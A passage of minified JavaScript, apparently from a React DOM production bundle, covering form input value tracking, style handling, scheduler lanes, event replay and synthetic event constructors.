        n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
        r = "" + e[t];
    if (!e.hasOwnProperty(t) && typeof n < "u" && typeof n.get == "function" && typeof n.set == "function") {
        var o = n.get,
            i = n.set;
        return (
            Object.defineProperty(e, t, {
                configurable: !0,
                get: function () {
                    return o.call(this);
                },
                set: function (s) {
                    (r = "" + s), i.call(this, s);
                },
            }),
            Object.defineProperty(e, t, { enumerable: n.enumerable }),
            {
                getValue: function () {
                    return r;
                },
                setValue: function (s) {
                    r = "" + s;
                },
                stopTracking: function () {
                    (e._valueTracker = null), delete e[t];
                },
            }
        );
    }
}
function Qi(e) {
    e._valueTracker || (e._valueTracker = u0(e));
}
function Uf(e) {
    if (!e) return !1;
    var t = e._valueTracker;
    if (!t) return !0;
    var n = t.getValue(),
        r = "";
    return e && (r = Bf(e) ? (e.checked ? "true" : "false") : e.value), (e = r), e !== n ? (t.setValue(e), !0) : !1;
}
function Is(e) {
    if (((e = e || (typeof document < "u" ? document : void 0)), typeof e > "u")) return null;
    try {
        return e.activeElement || e.body;
    } catch {
        return e.body;
    }
}
function Ol(e, t) {
    var n = t.checked;
    return me({}, t, {
        defaultChecked: void 0,
        defaultValue: void 0,
        value: void 0,
        checked: n ?? e._wrapperState.initialChecked,
    });
}
function yd(e, t) {
    var n = t.defaultValue == null ? "" : t.defaultValue,
        r = t.checked != null ? t.checked : t.defaultChecked;
    (n = Jn(t.value != null ? t.value : n)),
        (e._wrapperState = {
            initialChecked: r,
            initialValue: n,
            controlled: t.type === "checkbox" || t.type === "radio" ? t.checked != null : t.value != null,
        });
}
function Hf(e, t) {
    (t = t.checked), t != null && Xc(e, "checked", t, !1);
}
function _l(e, t) {
    Hf(e, t);
    var n = Jn(t.value),
        r = t.type;
    if (n != null)
        r === "number"
            ? ((n === 0 && e.value === "") || e.value != n) && (e.value = "" + n)
            : e.value !== "" + n && (e.value = "" + n);
    else if (r === "submit" || r === "reset") {
        e.removeAttribute("value");
        return;
    }
    t.hasOwnProperty("value")
        ? Fl(e, t.type, n)
        : t.hasOwnProperty("defaultValue") && Fl(e, t.type, Jn(t.defaultValue)),
        t.checked == null && t.defaultChecked != null && (e.defaultChecked = !!t.defaultChecked);
}
function vd(e, t, n) {
    if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
        var r = t.type;
        if (!((r !== "submit" && r !== "reset") || (t.value !== void 0 && t.value !== null))) return;
        (t = "" + e._wrapperState.initialValue), n || t === e.value || (e.value = t), (e.defaultValue = t);
    }
    (n = e.name),
        n !== "" && (e.name = ""),
        (e.defaultChecked = !!e._wrapperState.initialChecked),
        n !== "" && (e.name = n);
}
function Fl(e, t, n) {
    (t !== "number" || Is(e.ownerDocument) !== e) &&
        (n == null
            ? (e.defaultValue = "" + e._wrapperState.initialValue)
            : e.defaultValue !== "" + n && (e.defaultValue = "" + n));
}
var Go = Array.isArray;
function eo(e, t, n, r) {
    if (((e = e.options), t)) {
        t = {};
        for (var o = 0; o < n.length; o++) t["$" + n[o]] = !0;
        for (n = 0; n < e.length; n++)
            (o = t.hasOwnProperty("$" + e[n].value)),
                e[n].selected !== o && (e[n].selected = o),
                o && r && (e[n].defaultSelected = !0);
    } else {
        for (n = "" + Jn(n), t = null, o = 0; o < e.length; o++) {
            if (e[o].value === n) {
                (e[o].selected = !0), r && (e[o].defaultSelected = !0);
                return;
            }
            t !== null || e[o].disabled || (t = e[o]);
        }
        t !== null && (t.selected = !0);
    }
}
function zl(e, t) {
    if (t.dangerouslySetInnerHTML != null) throw Error(j(91));
    return me({}, t, { value: void 0, defaultValue: void 0, children: "" + e._wrapperState.initialValue });
}
function xd(e, t) {
    var n = t.value;
    if (n == null) {
        if (((n = t.children), (t = t.defaultValue), n != null)) {
            if (t != null) throw Error(j(92));
            if (Go(n)) {
                if (1 < n.length) throw Error(j(93));
                n = n[0];
            }
            t = n;
        }
        t == null && (t = ""), (n = t);
    }
    e._wrapperState = { initialValue: Jn(n) };
}
function $f(e, t) {
    var n = Jn(t.value),
        r = Jn(t.defaultValue);
    n != null &&
        ((n = "" + n),
        n !== e.value && (e.value = n),
        t.defaultValue == null && e.defaultValue !== n && (e.defaultValue = n)),
        r != null && (e.defaultValue = "" + r);
}
function wd(e) {
    var t = e.textContent;
    t === e._wrapperState.initialValue && t !== "" && t !== null && (e.value = t);
}
function Vf(e) {
    switch (e) {
        case "svg":
            return "http://www.w3.org/2000/svg";
        case "math":
            return "http://www.w3.org/1998/Math/MathML";
        default:
            return "http://www.w3.org/1999/xhtml";
    }
}
function Bl(e, t) {
    return e == null || e === "http://www.w3.org/1999/xhtml"
        ? Vf(t)
        : e === "http://www.w3.org/2000/svg" && t === "foreignObject"
          ? "http://www.w3.org/1999/xhtml"
          : e;
}
var qi,
    Wf = (function (e) {
        return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction
            ? function (t, n, r, o) {
                  MSApp.execUnsafeLocalFunction(function () {
                      return e(t, n, r, o);
                  });
              }
            : e;
    })(function (e, t) {
        if (e.namespaceURI !== "http://www.w3.org/2000/svg" || "innerHTML" in e) e.innerHTML = t;
        else {
            for (
                qi = qi || document.createElement("div"),
                    qi.innerHTML = "<svg>" + t.valueOf().toString() + "</svg>",
                    t = qi.firstChild;
                e.firstChild;

            )
                e.removeChild(e.firstChild);
            for (; t.firstChild; ) e.appendChild(t.firstChild);
        }
    });
function li(e, t) {
    if (t) {
        var n = e.firstChild;
        if (n && n === e.lastChild && n.nodeType === 3) {
            n.nodeValue = t;
            return;
        }
    }
    e.textContent = t;
}
var Xo = {
        animationIterationCount: !0,
        aspectRatio: !0,
        borderImageOutset: !0,
        borderImageSlice: !0,
        borderImageWidth: !0,
        boxFlex: !0,
        boxFlexGroup: !0,
        boxOrdinalGroup: !0,
        columnCount: !0,
        columns: !0,
        flex: !0,
        flexGrow: !0,
        flexPositive: !0,
        flexShrink: !0,
        flexNegative: !0,
        flexOrder: !0,
        gridArea: !0,
        gridRow: !0,
        gridRowEnd: !0,
        gridRowSpan: !0,
        gridRowStart: !0,
        gridColumn: !0,
        gridColumnEnd: !0,
        gridColumnSpan: !0,
        gridColumnStart: !0,
        fontWeight: !0,
        lineClamp: !0,
        lineHeight: !0,
        opacity: !0,
        order: !0,
        orphans: !0,
        tabSize: !0,
        widows: !0,
        zIndex: !0,
        zoom: !0,
        fillOpacity: !0,
        floodOpacity: !0,
        stopOpacity: !0,
        strokeDasharray: !0,
        strokeDashoffset: !0,
        strokeMiterlimit: !0,
        strokeOpacity: !0,
        strokeWidth: !0,
    },
    d0 = ["Webkit", "ms", "Moz", "O"];
Object.keys(Xo).forEach(function (e) {
    d0.forEach(function (t) {
        (t = t + e.charAt(0).toUpperCase() + e.substring(1)), (Xo[t] = Xo[e]);
    });
});
function Kf(e, t, n) {
    return t == null || typeof t == "boolean" || t === ""
        ? ""
        : n || typeof t != "number" || t === 0 || (Xo.hasOwnProperty(e) && Xo[e])
          ? ("" + t).trim()
          : t + "px";
}
function Gf(e, t) {
    e = e.style;
    for (var n in t)
        if (t.hasOwnProperty(n)) {
            var r = n.indexOf("--") === 0,
                o = Kf(n, t[n], r);
            n === "float" && (n = "cssFloat"), r ? e.setProperty(n, o) : (e[n] = o);
        }
}
var p0 = me(
    { menuitem: !0 },
    {
        area: !0,
        base: !0,
        br: !0,
        col: !0,
        embed: !0,
        hr: !0,
        img: !0,
        input: !0,
        keygen: !0,
        link: !0,
        meta: !0,
        param: !0,
        source: !0,
        track: !0,
        wbr: !0,
    }
);
function Ul(e, t) {
    if (t) {
        if (p0[e] && (t.children != null || t.dangerouslySetInnerHTML != null)) throw Error(j(137, e));
        if (t.dangerouslySetInnerHTML != null) {
            if (t.children != null) throw Error(j(60));
            if (typeof t.dangerouslySetInnerHTML != "object" || !("__html" in t.dangerouslySetInnerHTML))
                throw Error(j(61));
        }
        if (t.style != null && typeof t.style != "object") throw Error(j(62));
    }
}
function Hl(e, t) {
    if (e.indexOf("-") === -1) return typeof t.is == "string";
    switch (e) {
        case "annotation-xml":
        case "color-profile":
        case "font-face":
        case "font-face-src":
        case "font-face-uri":
        case "font-face-format":
        case "font-face-name":
        case "missing-glyph":
            return !1;
        default:
            return !0;
    }
}
var $l = null;
function eu(e) {
    return (
        (e = e.target || e.srcElement || window),
        e.correspondingUseElement && (e = e.correspondingUseElement),
        e.nodeType === 3 ? e.parentNode : e
    );
}
var Vl = null,
    to = null,
    no = null;
function Sd(e) {
    if ((e = Di(e))) {
        if (typeof Vl != "function") throw Error(j(280));
        var t = e.stateNode;
        t && ((t = Sa(t)), Vl(e.stateNode, e.type, t));
    }
}
function Qf(e) {
    to ? (no ? no.push(e) : (no = [e])) : (to = e);
}
function qf() {
    if (to) {
        var e = to,
            t = no;
        if (((no = to = null), Sd(e), t)) for (e = 0; e < t.length; e++) Sd(t[e]);
    }
}
function Xf(e, t) {
    return e(t);
}
function Yf() {}
var Ya = !1;
function Zf(e, t, n) {
    if (Ya) return e(t, n);
    Ya = !0;
    try {
        return Xf(e, t, n);
    } finally {
        (Ya = !1), (to !== null || no !== null) && (Yf(), qf());
    }
}
function ci(e, t) {
    var n = e.stateNode;
    if (n === null) return null;
    var r = Sa(n);
    if (r === null) return null;
    n = r[t];
    e: switch (t) {
        case "onClick":
        case "onClickCapture":
        case "onDoubleClick":
        case "onDoubleClickCapture":
        case "onMouseDown":
        case "onMouseDownCapture":
        case "onMouseMove":
        case "onMouseMoveCapture":
        case "onMouseUp":
        case "onMouseUpCapture":
        case "onMouseEnter":
            (r = !r.disabled) ||
                ((e = e.type), (r = !(e === "button" || e === "input" || e === "select" || e === "textarea"))),
                (e = !r);
            break e;
        default:
            e = !1;
    }
    if (e) return null;
    if (n && typeof n != "function") throw Error(j(231, t, typeof n));
    return n;
}
var Wl = !1;
if (mn)
    try {
        var Oo = {};
        Object.defineProperty(Oo, "passive", {
            get: function () {
                Wl = !0;
            },
        }),
            window.addEventListener("test", Oo, Oo),
            window.removeEventListener("test", Oo, Oo);
    } catch {
        Wl = !1;
    }
function f0(e, t, n, r, o, i, s, a, c) {
    var u = Array.prototype.slice.call(arguments, 3);
    try {
        t.apply(n, u);
    } catch (d) {
        this.onError(d);
    }
}
var Yo = !1,
    Ls = null,
    Ds = !1,
    Kl = null,
    m0 = {
        onError: function (e) {
            (Yo = !0), (Ls = e);
        },
    };
function h0(e, t, n, r, o, i, s, a, c) {
    (Yo = !1), (Ls = null), f0.apply(m0, arguments);
}
function g0(e, t, n, r, o, i, s, a, c) {
    if ((h0.apply(this, arguments), Yo)) {
        if (Yo) {
            var u = Ls;
            (Yo = !1), (Ls = null);
        } else throw Error(j(198));
        Ds || ((Ds = !0), (Kl = u));
    }
}
function Mr(e) {
    var t = e,
        n = e;
    if (e.alternate) for (; t.return; ) t = t.return;
    else {
        e = t;
        do (t = e), t.flags & 4098 && (n = t.return), (e = t.return);
        while (e);
    }
    return t.tag === 3 ? n : null;
}
function Jf(e) {
    if (e.tag === 13) {
        var t = e.memoizedState;
        if ((t === null && ((e = e.alternate), e !== null && (t = e.memoizedState)), t !== null)) return t.dehydrated;
    }
    return null;
}
function bd(e) {
    if (Mr(e) !== e) throw Error(j(188));
}
function y0(e) {
    var t = e.alternate;
    if (!t) {
        if (((t = Mr(e)), t === null)) throw Error(j(188));
        return t !== e ? null : e;
    }
    for (var n = e, r = t; ; ) {
        var o = n.return;
        if (o === null) break;
        var i = o.alternate;
        if (i === null) {
            if (((r = o.return), r !== null)) {
                n = r;
                continue;
            }
            break;
        }
        if (o.child === i.child) {
            for (i = o.child; i; ) {
                if (i === n) return bd(o), e;
                if (i === r) return bd(o), t;
                i = i.sibling;
            }
            throw Error(j(188));
        }
        if (n.return !== r.return) (n = o), (r = i);
        else {
            for (var s = !1, a = o.child; a; ) {
                if (a === n) {
                    (s = !0), (n = o), (r = i);
                    break;
                }
                if (a === r) {
                    (s = !0), (r = o), (n = i);
                    break;
                }
                a = a.sibling;
            }
            if (!s) {
                for (a = i.child; a; ) {
                    if (a === n) {
                        (s = !0), (n = i), (r = o);
                        break;
                    }
                    if (a === r) {
                        (s = !0), (r = i), (n = o);
                        break;
                    }
                    a = a.sibling;
                }
                if (!s) throw Error(j(189));
            }
        }
        if (n.alternate !== r) throw Error(j(190));
    }
    if (n.tag !== 3) throw Error(j(188));
    return n.stateNode.current === n ? e : t;
}
function em(e) {
    return (e = y0(e)), e !== null ? tm(e) : null;
}
function tm(e) {
    if (e.tag === 5 || e.tag === 6) return e;
    for (e = e.child; e !== null; ) {
        var t = tm(e);
        if (t !== null) return t;
        e = e.sibling;
    }
    return null;
}
var nm = at.unstable_scheduleCallback,
    kd = at.unstable_cancelCallback,
    v0 = at.unstable_shouldYield,
    x0 = at.unstable_requestPaint,
    Se = at.unstable_now,
    w0 = at.unstable_getCurrentPriorityLevel,
    tu = at.unstable_ImmediatePriority,
    rm = at.unstable_UserBlockingPriority,
    Os = at.unstable_NormalPriority,
    S0 = at.unstable_LowPriority,
    om = at.unstable_IdlePriority,
    ya = null,
    Gt = null;
function b0(e) {
    if (Gt && typeof Gt.onCommitFiberRoot == "function")
        try {
            Gt.onCommitFiberRoot(ya, e, void 0, (e.current.flags & 128) === 128);
        } catch {}
}
var jt = Math.clz32 ? Math.clz32 : P0,
    k0 = Math.log,
    C0 = Math.LN2;
function P0(e) {
    return (e >>>= 0), e === 0 ? 32 : (31 - ((k0(e) / C0) | 0)) | 0;
}
var Xi = 64,
    Yi = 4194304;
function Qo(e) {
    switch (e & -e) {
        case 1:
            return 1;
        case 2:
            return 2;
        case 4:
            return 4;
        case 8:
            return 8;
        case 16:
            return 16;
        case 32:
            return 32;
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return e & 4194240;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
            return e & 130023424;
        case 134217728:
            return 134217728;
        case 268435456:
            return 268435456;
        case 536870912:
            return 536870912;
        case 1073741824:
            return 1073741824;
        default:
            return e;
    }
}
function _s(e, t) {
    var n = e.pendingLanes;
    if (n === 0) return 0;
    var r = 0,
        o = e.suspendedLanes,
        i = e.pingedLanes,
        s = n & 268435455;
    if (s !== 0) {
        var a = s & ~o;
        a !== 0 ? (r = Qo(a)) : ((i &= s), i !== 0 && (r = Qo(i)));
    } else (s = n & ~o), s !== 0 ? (r = Qo(s)) : i !== 0 && (r = Qo(i));
    if (r === 0) return 0;
    if (t !== 0 && t !== r && !(t & o) && ((o = r & -r), (i = t & -t), o >= i || (o === 16 && (i & 4194240) !== 0)))
        return t;
    if ((r & 4 && (r |= n & 16), (t = e.entangledLanes), t !== 0))
        for (e = e.entanglements, t &= r; 0 < t; ) (n = 31 - jt(t)), (o = 1 << n), (r |= e[n]), (t &= ~o);
    return r;
}
function E0(e, t) {
    switch (e) {
        case 1:
        case 2:
        case 4:
            return t + 250;
        case 8:
        case 16:
        case 32:
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return t + 5e3;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
            return -1;
        case 134217728:
        case 268435456:
        case 536870912:
        case 1073741824:
            return -1;
        default:
            return -1;
    }
}
function N0(e, t) {
    for (var n = e.suspendedLanes, r = e.pingedLanes, o = e.expirationTimes, i = e.pendingLanes; 0 < i; ) {
        var s = 31 - jt(i),
            a = 1 << s,
            c = o[s];
        c === -1 ? (!(a & n) || a & r) && (o[s] = E0(a, t)) : c <= t && (e.expiredLanes |= a), (i &= ~a);
    }
}
function Gl(e) {
    return (e = e.pendingLanes & -1073741825), e !== 0 ? e : e & 1073741824 ? 1073741824 : 0;
}
function im() {
    var e = Xi;
    return (Xi <<= 1), !(Xi & 4194240) && (Xi = 64), e;
}
function Za(e) {
    for (var t = [], n = 0; 31 > n; n++) t.push(e);
    return t;
}
function Ii(e, t, n) {
    (e.pendingLanes |= t),
        t !== 536870912 && ((e.suspendedLanes = 0), (e.pingedLanes = 0)),
        (e = e.eventTimes),
        (t = 31 - jt(t)),
        (e[t] = n);
}
function T0(e, t) {
    var n = e.pendingLanes & ~t;
    (e.pendingLanes = t),
        (e.suspendedLanes = 0),
        (e.pingedLanes = 0),
        (e.expiredLanes &= t),
        (e.mutableReadLanes &= t),
        (e.entangledLanes &= t),
        (t = e.entanglements);
    var r = e.eventTimes;
    for (e = e.expirationTimes; 0 < n; ) {
        var o = 31 - jt(n),
            i = 1 << o;
        (t[o] = 0), (r[o] = -1), (e[o] = -1), (n &= ~i);
    }
}
function nu(e, t) {
    var n = (e.entangledLanes |= t);
    for (e = e.entanglements; n; ) {
        var r = 31 - jt(n),
            o = 1 << r;
        (o & t) | (e[r] & t) && (e[r] |= t), (n &= ~o);
    }
}
var oe = 0;
function sm(e) {
    return (e &= -e), 1 < e ? (4 < e ? (e & 268435455 ? 16 : 536870912) : 4) : 1;
}
var am,
    ru,
    lm,
    cm,
    um,
    Ql = !1,
    Zi = [],
    Vn = null,
    Wn = null,
    Kn = null,
    ui = new Map(),
    di = new Map(),
    Ln = [],
    A0 =
        "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(
            " "
        );
function Cd(e, t) {
    switch (e) {
        case "focusin":
        case "focusout":
            Vn = null;
            break;
        case "dragenter":
        case "dragleave":
            Wn = null;
            break;
        case "mouseover":
        case "mouseout":
            Kn = null;
            break;
        case "pointerover":
        case "pointerout":
            ui.delete(t.pointerId);
            break;
        case "gotpointercapture":
        case "lostpointercapture":
            di.delete(t.pointerId);
    }
}
function _o(e, t, n, r, o, i) {
    return e === null || e.nativeEvent !== i
        ? ((e = { blockedOn: t, domEventName: n, eventSystemFlags: r, nativeEvent: i, targetContainers: [o] }),
          t !== null && ((t = Di(t)), t !== null && ru(t)),
          e)
        : ((e.eventSystemFlags |= r), (t = e.targetContainers), o !== null && t.indexOf(o) === -1 && t.push(o), e);
}
function j0(e, t, n, r, o) {
    switch (t) {
        case "focusin":
            return (Vn = _o(Vn, e, t, n, r, o)), !0;
        case "dragenter":
            return (Wn = _o(Wn, e, t, n, r, o)), !0;
        case "mouseover":
            return (Kn = _o(Kn, e, t, n, r, o)), !0;
        case "pointerover":
            var i = o.pointerId;
            return ui.set(i, _o(ui.get(i) || null, e, t, n, r, o)), !0;
        case "gotpointercapture":
            return (i = o.pointerId), di.set(i, _o(di.get(i) || null, e, t, n, r, o)), !0;
    }
    return !1;
}
function dm(e) {
    var t = dr(e.target);
    if (t !== null) {
        var n = Mr(t);
        if (n !== null) {
            if (((t = n.tag), t === 13)) {
                if (((t = Jf(n)), t !== null)) {
                    (e.blockedOn = t),
                        um(e.priority, function () {
                            lm(n);
                        });
                    return;
                }
            } else if (t === 3 && n.stateNode.current.memoizedState.isDehydrated) {
                e.blockedOn = n.tag === 3 ? n.stateNode.containerInfo : null;
                return;
            }
        }
    }
    e.blockedOn = null;
}
function ws(e) {
    if (e.blockedOn !== null) return !1;
    for (var t = e.targetContainers; 0 < t.length; ) {
        var n = ql(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
        if (n === null) {
            n = e.nativeEvent;
            var r = new n.constructor(n.type, n);
            ($l = r), n.target.dispatchEvent(r), ($l = null);
        } else return (t = Di(n)), t !== null && ru(t), (e.blockedOn = n), !1;
        t.shift();
    }
    return !0;
}
function Pd(e, t, n) {
    ws(e) && n.delete(t);
}
function R0() {
    (Ql = !1),
        Vn !== null && ws(Vn) && (Vn = null),
        Wn !== null && ws(Wn) && (Wn = null),
        Kn !== null && ws(Kn) && (Kn = null),
        ui.forEach(Pd),
        di.forEach(Pd);
}
function Fo(e, t) {
    e.blockedOn === t &&
        ((e.blockedOn = null), Ql || ((Ql = !0), at.unstable_scheduleCallback(at.unstable_NormalPriority, R0)));
}
function pi(e) {
    function t(o) {
        return Fo(o, e);
    }
    if (0 < Zi.length) {
        Fo(Zi[0], e);
        for (var n = 1; n < Zi.length; n++) {
            var r = Zi[n];
            r.blockedOn === e && (r.blockedOn = null);
        }
    }
    for (
        Vn !== null && Fo(Vn, e),
            Wn !== null && Fo(Wn, e),
            Kn !== null && Fo(Kn, e),
            ui.forEach(t),
            di.forEach(t),
            n = 0;
        n < Ln.length;
        n++
    )
        (r = Ln[n]), r.blockedOn === e && (r.blockedOn = null);
    for (; 0 < Ln.length && ((n = Ln[0]), n.blockedOn === null); ) dm(n), n.blockedOn === null && Ln.shift();
}
var ro = wn.ReactCurrentBatchConfig,
    Fs = !0;
function M0(e, t, n, r) {
    var o = oe,
        i = ro.transition;
    ro.transition = null;
    try {
        (oe = 1), ou(e, t, n, r);
    } finally {
        (oe = o), (ro.transition = i);
    }
}
function I0(e, t, n, r) {
    var o = oe,
        i = ro.transition;
    ro.transition = null;
    try {
        (oe = 4), ou(e, t, n, r);
    } finally {
        (oe = o), (ro.transition = i);
    }
}
function ou(e, t, n, r) {
    if (Fs) {
        var o = ql(e, t, n, r);
        if (o === null) ll(e, t, r, zs, n), Cd(e, r);
        else if (j0(o, e, t, n, r)) r.stopPropagation();
        else if ((Cd(e, r), t & 4 && -1 < A0.indexOf(e))) {
            for (; o !== null; ) {
                var i = Di(o);
                if ((i !== null && am(i), (i = ql(e, t, n, r)), i === null && ll(e, t, r, zs, n), i === o)) break;
                o = i;
            }
            o !== null && r.stopPropagation();
        } else ll(e, t, r, null, n);
    }
}
var zs = null;
function ql(e, t, n, r) {
    if (((zs = null), (e = eu(r)), (e = dr(e)), e !== null))
        if (((t = Mr(e)), t === null)) e = null;
        else if (((n = t.tag), n === 13)) {
            if (((e = Jf(t)), e !== null)) return e;
            e = null;
        } else if (n === 3) {
            if (t.stateNode.current.memoizedState.isDehydrated) return t.tag === 3 ? t.stateNode.containerInfo : null;
            e = null;
        } else t !== e && (e = null);
    return (zs = e), null;
}
function pm(e) {
    switch (e) {
        case "cancel":
        case "click":
        case "close":
        case "contextmenu":
        case "copy":
        case "cut":
        case "auxclick":
        case "dblclick":
        case "dragend":
        case "dragstart":
        case "drop":
        case "focusin":
        case "focusout":
        case "input":
        case "invalid":
        case "keydown":
        case "keypress":
        case "keyup":
        case "mousedown":
        case "mouseup":
        case "paste":
        case "pause":
        case "play":
        case "pointercancel":
        case "pointerdown":
        case "pointerup":
        case "ratechange":
        case "reset":
        case "resize":
        case "seeked":
        case "submit":
        case "touchcancel":
        case "touchend":
        case "touchstart":
        case "volumechange":
        case "change":
        case "selectionchange":
        case "textInput":
        case "compositionstart":
        case "compositionend":
        case "compositionupdate":
        case "beforeblur":
        case "afterblur":
        case "beforeinput":
        case "blur":
        case "fullscreenchange":
        case "focus":
        case "hashchange":
        case "popstate":
        case "select":
        case "selectstart":
            return 1;
        case "drag":
        case "dragenter":
        case "dragexit":
        case "dragleave":
        case "dragover":
        case "mousemove":
        case "mouseout":
        case "mouseover":
        case "pointermove":
        case "pointerout":
        case "pointerover":
        case "scroll":
        case "toggle":
        case "touchmove":
        case "wheel":
        case "mouseenter":
        case "mouseleave":
        case "pointerenter":
        case "pointerleave":
            return 4;
        case "message":
            switch (w0()) {
                case tu:
                    return 1;
                case rm:
                    return 4;
                case Os:
                case S0:
                    return 16;
                case om:
                    return 536870912;
                default:
                    return 16;
            }
        default:
            return 16;
    }
}
var Un = null,
    iu = null,
    Ss = null;
function fm() {
    if (Ss) return Ss;
    var e,
        t = iu,
        n = t.length,
        r,
        o = "value" in Un ? Un.value : Un.textContent,
        i = o.length;
    for (e = 0; e < n && t[e] === o[e]; e++);
    var s = n - e;
    for (r = 1; r <= s && t[n - r] === o[i - r]; r++);
    return (Ss = o.slice(e, 1 < r ? 1 - r : void 0));
}
function bs(e) {
    var t = e.keyCode;
    return (
        "charCode" in e ? ((e = e.charCode), e === 0 && t === 13 && (e = 13)) : (e = t),
        e === 10 && (e = 13),
        32 <= e || e === 13 ? e : 0
    );
}
function Ji() {
    return !0;
}
function Ed() {
    return !1;
}
function ct(e) {
    function t(n, r, o, i, s) {
        (this._reactName = n),
            (this._targetInst = o),
            (this.type = r),
            (this.nativeEvent = i),
            (this.target = s),
            (this.currentTarget = null);
        for (var a in e) e.hasOwnProperty(a) && ((n = e[a]), (this[a] = n ? n(i) : i[a]));
        return (
            (this.isDefaultPrevented = (i.defaultPrevented != null ? i.defaultPrevented : i.returnValue === !1)
                ? Ji
                : Ed),
            (this.isPropagationStopped = Ed),
            this
        );
    }
    return (
        me(t.prototype, {
            preventDefault: function () {
                this.defaultPrevented = !0;
                var n = this.nativeEvent;
                n &&
                    (n.preventDefault ? n.preventDefault() : typeof n.returnValue != "unknown" && (n.returnValue = !1),
                    (this.isDefaultPrevented = Ji));
            },
            stopPropagation: function () {
                var n = this.nativeEvent;
                n &&
                    (n.stopPropagation
                        ? n.stopPropagation()
                        : typeof n.cancelBubble != "unknown" && (n.cancelBubble = !0),
                    (this.isPropagationStopped = Ji));
            },
            persist: function () {},
            isPersistent: Ji,
        }),
        t
    );
}
var No = {
        eventPhase: 0,
        bubbles: 0,
        cancelable: 0,
        timeStamp: function (e) {
            return e.timeStamp || Date.now();
        },
        defaultPrevented: 0,
        isTrusted: 0,
    },
    su = ct(No),
    Li = me({}, No, { view: 0, detail: 0 }),
    L0 = ct(Li),
    Ja,
    el,
    zo,
    va = me({}, Li, {
        screenX: 0,
        screenY: 0,
        clientX: 0,
        clientY: 0,
        pageX: 0,
        pageY: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        getModifierState: au,
        button: 0,
        buttons: 0,
        relatedTarget: function (e) {
            return e.relatedTarget === void 0
                ? e.fromElement === e.srcElement
                    ? e.toElement
                    : e.fromElement
                : e.relatedTarget;
        },
        movementX: function (e) {
            return "movementX" in e
                ? e.movementX
                : (e !== zo &&
                      (zo && e.type === "mousemove"
                          ? ((Ja = e.screenX - zo.screenX), (el = e.screenY - zo.screenY))
                          : (el = Ja = 0),
                      (zo = e)),
                  Ja);
        },
        movementY: function (e) {
            return "movementY" in e ? e.movementY : el;
        },
    }),
    Nd = ct(va),
    D0 = me({}, va, { dataTransfer: 0 }),
    O0 = ct(D0),
    _0 = me({}, Li, { relatedTarget: 0 }),
    tl = ct(_0),
    F0 = me({}, No, { animationName: 0, elapsedTime: 0, pseudoElement: 0 }),
    z0 = ct(F0),
    B0 = me({}, No, {
        clipboardData: function (e) {
            return "clipboardData" in e ? e.clipboardData : window.clipboardData;
        },
    }),
    U0 = ct(B0),
    H0 = me({}, No, { data: 0 }),
    Td = ct(H0),
    $0 = {
        Esc: "Escape",
        Spacebar: " ",
        Left: "ArrowLeft",
        Up: "ArrowUp",
        Right: "ArrowRight",
        Down: "ArrowDown",
        Del: "Delete",
        Win: "OS",
        Menu: "ContextMenu",
        Apps: "ContextMenu",
        Scroll: "ScrollLock",
        MozPrintableKey: "Unidentified",
    },
    V0 = {
        8: "Backspace",
        9: "Tab",
        12: "Clear",
        13: "Enter",
        16: "Shift",
        17: "Control",
        18: "Alt",
        19: "Pause",
        20: "CapsLock",
        27: "Escape",
        32: " ",
        33: "PageUp",
        34: "PageDown",
        35: "End",
        36: "Home",
        37: "ArrowLeft",
        38: "ArrowUp",
        39: "ArrowRight",
        40: "ArrowDown",
        45: "Insert",
        46: "Delete",
        112: "F1",
        113: "F2",
        114: "F3",
        115: "F4",
        116: "F5",
        117: "F6",
        118: "F7",
        119: "F8",
        120: "F9",
        121: "F10",
        122: "F11",
        123: "F12",
        144: "NumLock",
        145: "ScrollLock",
        224: "Meta",
    },
    W0 = { Alt: "altKey", Control: "ctrlKey", Meta: "metaKey", Shift: "shiftKey" };
function K0(e) {
    var t = this.nativeEvent;
    return t.getModifierState ? t.getModifierState(e) : (e = W0[e]) ? !!t[e] : !1;
}
function au() {
    return K0;
}
var G0 = me({}, Li, {
        key: function (e) {
            if (e.key) {
                var t = $0[e.key] || e.key;
                if (t !== "Unidentified") return t;
            }
            return e.type === "keypress"
                ? ((e = bs(e)), e === 13 ? "Enter" : String.fromCharCode(e))
                : e.type === "keydown" || e.type === "keyup"
                  ? V0[e.keyCode] || "Unidentified"
                  : "";
        },
        code: 0,
        location: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        repeat: 0,
        locale: 0,
        getModifierState: au,
        charCode: function (e) {
            return e.type === "keypress" ? bs(e) : 0;
        },
        keyCode: function (e) {
            return e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0;
        },
        which: function (e) {
            return e.type === "keypress" ? bs(e) : e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0;
        },
    }),
    Q0 = ct(G0),
    q0 = me({}, va, {
        pointerId: 0,
        width: 0,
        height: 0,
        pressure: 0,
        tangentialPressure: 0,
        tiltX: 0,
        tiltY: 0,
        twist: 0,
        pointerType: 0,
        isPrimary: 0,
    }),
    Ad = ct(q0),
    X0 = me({}, Li, {
        touches: 0,
        targetTouches: 0,
        changedTouches: 0,
        altKey: 0,
        metaKey: 0,
        ctrlKey: 0,
        shiftKey: 0,
        getModifierState: au,
    }),
    Y0 = ct(X0),
    Z0 = me({}, No, { propertyName: 0, elapsedTime: 0, pseudoElement: 0 }),
    J0 = ct(Z0),
    e1 = me({}, va, {
        deltaX: function (e) {
            return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0;
        },
